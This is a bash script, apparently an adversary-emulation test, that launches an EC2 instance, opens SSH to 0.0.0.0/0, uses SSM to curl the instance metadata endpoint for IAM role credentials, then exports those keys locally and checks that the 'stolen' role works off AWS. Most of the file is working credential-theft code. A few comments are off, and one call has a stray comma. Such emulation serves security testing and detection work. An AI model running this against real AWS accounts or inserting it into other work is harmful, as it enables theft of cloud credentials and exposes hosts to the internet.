#!/bin/bash
set -e

# Get Latest AMI
# Fetches the ID of the latest Amazon Machine Image (AMI) for the
# specified OS distribution, version, and architecture.
#
# Usage:
#   get_latest_ami [distro] [version] [architecture]
#
# Output:
#   Outputs the ID of the AMI.
#
# Example(s):
#   get_latest_ami "ubuntu" "20.04" "amd64"
# Get Latest AMI
# Fetches the ID of the latest Amazon Machine Image (AMI) for the
# specified OS distribution, version, and architecture.
#
# Usage:
#   get_latest_ami [distro] [version] [architecture]
#
# Output:
#   Outputs the ID of the AMI.
#
# Example(s):
#   get_latest_ami "ubuntu" "20.04" "amd64"
function get_latest_ami()
                          {
    local distro=$1
    local version=$2
    local architecture=$3

    if [[ "$distro" == "ubuntu" ]]; then
        if [[ "$version" == "22.04" ]]; then
            if [[ "$architecture" == "amd64" ]]; then
                amiNamePattern="ubuntu/images/hvm-ssd/ubuntu-jammy-%s-amd64-server-*"
            elif [[ "$architecture" == "arm64" ]]; then
                amiNamePattern="ubuntu/images/hvm-ssd/ubuntu-jammy-%s-arm64-server-*"
            else
                echo "Unsupported architecture: $architecture"
                return 1
            fi
        elif [[ "$version" == "20.04" ]]; then
            if [[ "$architecture" == "amd64" ]]; then
                amiNamePattern="ubuntu/images/hvm-ssd/ubuntu-focal-%s-amd64-server-*"
            elif [[ "$architecture" == "arm64" ]]; then
                amiNamePattern="ubuntu/images/hvm-ssd/ubuntu-focal-%s-arm64-server-*"
            else
                echo "Unsupported architecture: $architecture"
                return 1
            fi
        elif [[ "$version" == "18.04" ]]; then
            if [[ "$architecture" == "amd64" ]]; then
                amiNamePattern="ubuntu/images/hvm-ssd/ubuntu-bionic-%s-amd64-server-*"
            elif [[ "$architecture" == "arm64" ]]; then
                amiNamePattern="ubuntu/images/hvm-ssd/ubuntu-bionic-%s-arm64-server-*"
            else
                echo "Unsupported architecture: $architecture"
                return 1
            fi
        else
            echo "Unsupported version: $version"
            return 1
        fi
        owner="099720109477"  # Canonical
    elif [[ "$distro" == "centos" ]]; then
        if [[ "$version" == "7" ]]; then
            if [[ "$architecture" == "x86_64" ]]; then
                amiNamePattern="CentOS Linux %s x86_64 HVM EBS*"
            elif [[ "$architecture" == "arm64" ]]; then
                amiNamePattern="CentOS Linux %s arm64 HVM EBS*"
            else
                echo "Unsupported architecture: $architecture"
                return 1
            fi
        elif [[ "$version" == "8" ]]; then
            if [[ "$architecture" == "x86_64" ]]; then
                amiNamePattern="CentOS %s AMI*"
            elif [[ "$architecture" == "arm64" ]]; then
                amiNamePattern="CentOS %s ARM64 AMI*"
            else
                echo "Unsupported architecture: $architecture"
                return 1
            fi
        else
            echo "Unsupported version: $version"
            return 1
        fi
        owner="679593333241"  # Kali Linux
    elif [[ "$distro" == "debian" ]]; then
        if [[ "$version" == "10" ]]; then
            if [[ "$architecture" == "amd64" ]]; then
                amiNamePattern="debian-%s-buster-hvm-amd64-gp2*"
            elif [[ "$architecture" == "arm64" ]]; then
                amiNamePattern="debian-%s-buster-hvm-arm64-gp2*"
            else
                echo "Unsupported architecture: $architecture"
                return 1
            fi
        else
            echo "Unsupported version: $version"
            return 1
        fi
        owner="136693071363"  # Debian
    elif [[ "$distro" == "kali" ]]; then
        if [[ "$version" == "2023.1" ]]; then
            if [[ "$architecture" == "amd64" ]]; then
                amiNamePattern="kali-linux-%s-amd64*"
            elif [[ "$architecture" == "arm64" ]]; then
                amiNamePattern="kali-linux-%s-arm64*"
            else
                echo "Unsupported architecture: $architecture"
                return 1
            fi
        else
            echo "Unsupported version: $version"
            return 1
        fi
        owner="679593333241"  # Kali Linux
    else
        echo "Unsupported distribution: $distro"
        return 1
    fi

    # shellcheck disable=SC2059
    amiNamePattern=$(printf "$amiNamePattern" "$version")

    wait

    # Extract the AMI ID using string manipulation
    AMI_ID=$(aws ec2 describe-images \
        --filters "Name=name,Values=$amiNamePattern" \
        --owners "$owner" \
        --query 'sort_by(Images, &CreationDate)[-1].ImageId' \
        --output text)

    if [ -z "$AMI_ID" ]; then
        echo "No images found for distro: $distro, version: $version, architecture: $architecture"
        return 1
    fi

    echo "$AMI_ID"
}

# Authorize Security Group Ingress
# Authorizes inbound traffic for the specified security group if the rule doesn't already exist.
# Creates the security group if it doesn't already exist.
#
# Usage:
#   authorize_security_group_ingress [group_name] [group_description] [vpc_id] [protocol] [port] [cidr]
#
# Output:
#   Returns the id of the security group, but configures the security group to allow inbound traffic if the rule is added.
#   If the security group or rule already exists, outputs a message indicating the existing group or rule.
#
# Example(s):
#   SECURITY_GROUP_ID=$(authorize_security_group_ingress "my_security_group" "Description of my security group" "vpc-0abcd1234efgh5678" "tcp" "22" "0.0.0.0/0")
function authorize_security_group_ingress()
                                            {
    local group_name=$1
    local group_description=$2
    local vpc_id=$3
    local protocol=$4
    local port=$5
    local cidr=$6

    # Check if the security group already exists
    local security_group_id
    security_group_id=$(aws ec2 describe-security-groups --filters Name=group-name,Values="$group_name" --query 'SecurityGroups[0].GroupId' --output text)

    # If the security group doesn't exist or command fails, create it
    if [ -z "$security_group_id" ] || [ "$security_group_id" == "None" ]; then
        if ! security_group_id=$(aws ec2 create-security-group --group-name "$group_name" --description "$group_description" --vpc-id "$vpc_id" --query 'GroupId' --output text); then
            echo "Failed to create security group: $group_name"
            return 1
        fi
        echo "Created security group $group_name with ID: $security_group_id"
    else
        echo "Security group $group_name already exists with ID: $security_group_id"
    fi

    # Check if the ingress rule already exists
    local existing_rule
    existing_rule=$(aws ec2 describe-security-groups \
        --group-ids "$security_group_id" \
        --query "SecurityGroups[0].IpPermissions[?IpProtocol=='$protocol' && FromPort=='$port' && contains(IpRanges[].CidrIp, '$cidr')]")

    if [ -n "$existing_rule" ]; then
        echo "Ingress rule already exists for: $protocol port $port from $cidr"
        echo "$security_group_id"
    else
        if aws ec2 authorize-security-group-ingress \
            --group-id "$security_group_id" \
            --protocol "$protocol" \
            --port "$port" \
            --cidr "$cidr"; then
            echo "Added ingress rule to security group $group_name"
            echo "$security_group_id"
        else
            echo "Failed to add ingress rule to security group $group_name"
            return 1
        fi
    fi
}

# Find Default VPC
# Finds the default VPC ID.
#
# Usage:
#   find_default_vpc
#
# Output:
#   Outputs the default VPC ID.
#
# Example(s):
#   find_default_vpc
function find_default_vpc()
                            {
    aws ec2 describe-vpcs \
        --filters "Name=isDefault,Values=true" \
        --output text --query 'Vpcs[0].VpcId'
}

# Find Default Subnet
# Finds the default subnet ID.
#
# Usage:
#   find_default_subnet
#
# Output:
#   Outputs the default subnet ID.
#
# Example(s):
#   find_default_subnet
function find_default_subnet()
                               {
    aws ec2 describe-subnets \
        --filters "Name=default-for-az,Values=true" \
        --output text --query 'Subnets[0].SubnetId'
}

# Create EC2 Instance
# Creates an EC2 instance with the specified AMI, instance type, and security group.
#
# Usage:
#   create_ec2_instance
#
# Output:
#   Outputs the ID of the created EC2 instance.
#
# Example(s):
#   create_ec2_instance
create_ec2_instance()
                      {
    INSTANCE_TYPE="t3.micro"
    IAM_INSTANCE_PROFILE="AmazonSSMInstanceProfileForInstances"
    INSTANCE_NAME="pt-ttp-steal-creds"

    SECURITY_GROUP_ID=$(authorize_security_group_ingress "pt-ttp-sg" "Part of MOSFET OFU" "${VPC_ID}" "tcp" 22 "0.0.0.0/0" | tail -n 1)

    INSTANCE_ID=$(aws ec2 run-instances \
        --image-id "$AMI_ID" \
        --count 1 \
        --instance-type "$INSTANCE_TYPE" \
        --security-group-ids "$SECURITY_GROUP_ID" \
        --subnet-id "$DEFAULT_SUBNET_ID" \
        --iam-instance-profile "Name=$IAM_INSTANCE_PROFILE" \
        --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=$INSTANCE_NAME}]" \
        --query 'Instances[0].InstanceId' \
        --output text)

    wait_for_initialization

    if [ -z "$INSTANCE_ID" ]; then
        echo "Failed to create EC2 instance"
        exit 1
    fi
    echo "Created EC2 instance: $INSTANCE_ID" >&2
    echo "${INSTANCE_ID}"
}

# Wait for Initialization
# Waits until the newly created EC2 instance changes its status
# from "initializing" to another state, signaling that initialization
# has completed.
#
# Usage:
#   wait_for_initialization
#
# Output:
#   No output, but pauses script execution until the EC2 instance has finished initializing.
#
# Example(s):
#   wait_for_initialization
wait_for_initialization()
                          {
    instance_status="initializing"
    while [[ "$instance_status" == "initializing" || "$instance_status" == "null" ]]; do
        instance_status=$(aws ec2 describe-instance-status --instance-id "${INSTANCE_ID}" \
            | jq -r ".InstanceStatuses[0].InstanceStatus.Status")
        sleep 10
    done
}

# Wait for Command
# Waits for the previously run command to complete.
#
# Usage:
#   wait_for_command [command_id]
#
# Output:
#   No output, but pauses script execution until the specified command has finished running.
#
# Example(s):
#   wait_for_command "0abcd1234efgh5678"
wait_for_command()
                   {
    local command_id=$1
    local command_status

    while true; do
        command_status=$(aws ssm list-command-invocations --command-id "$command_id" --details --query 'CommandInvocations[0].Status' --output text)

        if [ -z "$command_status" ]; then
            echo "Failed to fetch command status."
            exit 1
        elif [ "$command_status" == "Success" ]; then
            break
        elif [ "$command_status" == "Failed" ]; then
            echo "Command execution failed."
            exit 1
        fi

        echo "Waiting for command to finish..."
        sleep 5
    done
}

# Get Instance Role Credentials
# Retrieves the IAM role credentials from the specified EC2 instance.
#
# Usage:
#   get_instance_role_credentials
#
# Output:
#   Outputs the IAM role credentials.
#
# Example(s):
#   get_instance_role_credentials
get_instance_role_credentials()
                                {
    COMMAND_ID=$(aws ssm send-command --instance-ids "$INSTANCE_ID" --document-name AWS-RunShellScript --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'"$ROLE_NAME"'"]' --query "Command.CommandId" --output text)
    wait_for_command "$COMMAND_ID"
    CREDENTIALS=$(aws ssm get-command-invocation --command-id "$COMMAND_ID" --instance-id "$INSTANCE_ID" --query 'StandardOutputContent' --output text)
    echo "$CREDENTIALS"
}

# Find the default VPC and subnet
VPC_ID=$(find_default_vpc)
DEFAULT_SUBNET_ID=$(find_default_subnet)

# Create security group for SSM and authorize inbound traffic
# for SSM (TCP port 22 for SSH)
SECURITY_GROUP_ID=$(authorize_security_group_ingress "pt-ttp-sg" "Part of MOSFET OFU", "$VPC_ID" "tcp" 22 "0.0.0.0/0")

# Get latest AMI ID
AMI_ID=$(get_latest_ami "ubuntu" "22.04" "amd64")
export AMI_ID

# Create an EC2 instance
INSTANCE_ID=$(create_ec2_instance)
export INSTANCE_ID

ROLE_NAME="AmazonSSMRoleForInstances"
export ROLE_NAME

# Fetch role credentials
CREDENTIALS=$(get_instance_role_credentials)

# Parse the JSON output to fetch AWS_ACCESS_KEY_ID,
# AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN
AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r .AccessKeyId)
export AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r .SecretAccessKey)
export AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r .Token)
export AWS_SESSION_TOKEN

# Confirm role was stolen successfully (run locally)
aws sts get-caller-identity --no-cli-pager

# Get caller identity
CALLER_IDENTITY=$(aws sts get-caller-identity --no-cli-pager)

# Extract the Arn field
CALLER_ARN=$(echo "$CALLER_IDENTITY" | jq -r .Arn)

# Check if the Arn contains the expected role
if [[ $CALLER_ARN == *"/$ROLE_NAME"* ]]; then
    echo "Successfully stole instance profile credentials and ran them on a non-AWS system!"
else
    echo "Failed to steal instance profile credentials."
    exit 1
fi
